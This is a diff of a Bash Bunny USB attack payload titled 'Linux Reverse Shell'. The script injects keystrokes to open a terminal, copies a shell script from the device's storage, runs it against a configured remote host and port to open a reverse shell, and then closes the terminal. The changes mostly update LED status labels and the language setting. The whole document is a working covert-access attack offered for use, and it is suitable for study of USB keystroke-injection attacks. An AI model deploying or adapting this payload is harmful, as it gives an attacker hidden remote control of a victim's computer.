@@ -2,28 +2,25 @@
 #
 # Title:         Linux Reverse Shell
 # Author:        tuzzmaniandevil
-# Version:       1.0
+# Version:       1.1
 #
 # Runs a script in the background that creates a reverse shell connection to the configured address and then removes itself.
 #
-# Red ...............Setup
-# Blue Blinking......Executing
-# Green..............Finished
+# Magenta..................Setup
+# Yellow single blink......Executing
+# Green....................Finished
 
 # Config options
 RHOST=127.0.0.1
 RPORT=4444
 
 # Start Setup
-LED R
+LED SETUP
 
 # Set Attack Mode
 ATTACKMODE HID STORAGE
 
-LANGUAGE='us'
-
-# Source bunny_helpers.sh to get environment variable SWITCH_POSITION
-source bunny_helpers.sh
+DUCKY_LANG us
 
 # Wait for Storage to mount
 sleep 5
@@ -33,7 +30,7 @@ Q CTRL-ALT t
 
 # Wait for terminal to open
 sleep 1
-LED B 250
+LED STAGE1
 
 # Copy bash script
 Q STRING "cp \$(readlink -f /dev/disk/by-label/BashBunny | while read dev;do mount | grep \"\$dev\b\" | awk '{print \$3}';done)/payloads/"
@@ -42,8 +39,8 @@ Q STRING "/a.sh ~/a.sh && chmod +x ~/a.sh && ~/a.sh $RHOST $RPORT"
 Q ENTER
 
 # Quit the terminal
-LED R G 250
+LED CLEANUP
 Q STRING exit
 Q ENTER
 
-LED G
+LED FINISH
